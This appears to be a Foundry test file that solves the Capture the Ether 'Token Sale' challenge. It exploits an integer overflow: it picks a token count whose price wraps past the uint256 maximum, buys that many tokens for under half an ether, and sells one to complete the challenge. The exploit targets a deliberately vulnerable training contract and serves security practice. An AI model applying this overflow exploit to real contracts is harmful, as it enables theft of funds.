pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/capture-the-ether/TokenSale.sol";

// exploit overflow
contract TokenSaleTest is Test {
    TokenSale instance;

    receive() external payable {}

    function setUp() public {
        instance = new TokenSale{value: 1 ether}();
    }

    function test() public {
        assertFalse(instance.isComplete());

        // 115792089237316195423570985008687907853269984665640564039458
        uint256 numTokens = type(uint256).max / 1e18 + 1;
        // 115792089237316195423570985008687907853269984665640564039458 * 1e18 - (type(uint256).max + 1)
        // = 1e18 - (584007913129639935 + 1) = 415992086870360064 = 0.415992086870360064 * 1e18
        uint256 valueToSent = 415992086870360064;

        instance.buy{value: valueToSent}(numTokens);
        assertEq(instance.balanceOf(address(this)), numTokens);

        instance.sell(1);
        assertTrue(instance.isComplete());
    }
}
